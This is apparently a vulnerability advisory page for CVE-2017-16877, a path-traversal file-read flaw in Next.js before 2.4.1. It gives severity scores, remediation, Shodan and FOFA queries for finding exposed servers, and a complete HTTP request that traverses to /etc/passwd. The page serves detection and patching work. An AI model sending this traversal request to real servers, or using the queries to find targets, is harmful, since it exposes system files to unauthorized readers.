---
layout: "post"
cve_id: "CVE-2017-16877"
title: "Nextjs <2.4.1 - Local File Inclusion"
pcap: true
pcap_path: "/pcaps/2017/CVE-2017-16877.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2017/CVE-2017-16877.yaml"
author: "pikpikcu"
severity: "high"
impact: "Successful exploitation of this vulnerability could allow an attacker to read sensitive files on the server, leading to unauthorized access and potential data leakage.
"
remediation: "Upgrade Nextjs to version 2.4.1 or above to mitigate this vulnerability.
"
reference:
  - "https://medium.com/@theRaz0r/arbitrary-file-reading-in-next-js-2-4-1-34104c4e75e9"
  - "https://github.com/zeit/next.js/releases/tag/2.4.1"
  - "https://nvd.nist.gov/vuln/detail/CVE-2017-16877"
  - "https://github.com/vercel/next.js/commit/02fe7cf63f6265d73bdaf8bc50a4f2fb539dcd00"
  - "https://github.com/ARPSyndicate/cvemon"
classification: "{'cvss-metrics': 'CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', 'cvss-score': 7.5, 'cve-id': 'CVE-2017-16877', 'cwe-id': 'CWE-22', 'epss-score': 0.83198, 'epss-percentile': 0.99238, 'cpe': 'cpe:2.3:a:zeit:next.js:*:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 1, 'vendor': 'zeit', 'product': 'next.js', 'shodan-query': ['http.html:"/_next/static"', 'cpe:"cpe:2.3:a:zeit:next.js"'], 'fofa-query': 'body="/_next/static"'}"
tags:
  - "cve"
  - "cve2017"
  - "nextjs"
  - "lfi"
  - "traversal"
  - "zeit"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
ZEIT Next.js before 2.4.1 is susceptible to local file inclusion via the /_next and /static request namespace, allowing attackers to obtain sensitive information.

## ðŸŒ HTTP Request
```nohighlight
GET /_next/../../../../../../../../../../etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

